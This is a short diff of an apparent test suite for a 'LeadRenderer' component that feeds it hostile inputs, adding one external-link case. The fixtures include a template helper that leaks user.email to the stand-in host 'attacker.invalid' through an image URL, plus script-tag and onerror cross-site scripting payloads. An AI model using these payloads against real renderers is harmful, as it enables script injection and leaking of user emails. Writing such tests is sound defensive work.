@@ -49,7 +49,8 @@ describe('LeadRenderer', () => {
               '{{img src=(join "https://attacker.invalid/" user.email)}}',
               '<img src="https://attacker.invalid/raw" onerror="alert(1)" />',
               '<script>alert(1)</script>',
-              '![remote image](https://attacker.invalid/markdown)'
+              '![remote image](https://attacker.invalid/markdown)',
+              '[external link](https://attacker.invalid/page)'
             ].join('\n\n'),
             metadata: JSON.stringify({ owner: 'howler.ai_triage', schema_version: 1 })
           } as any
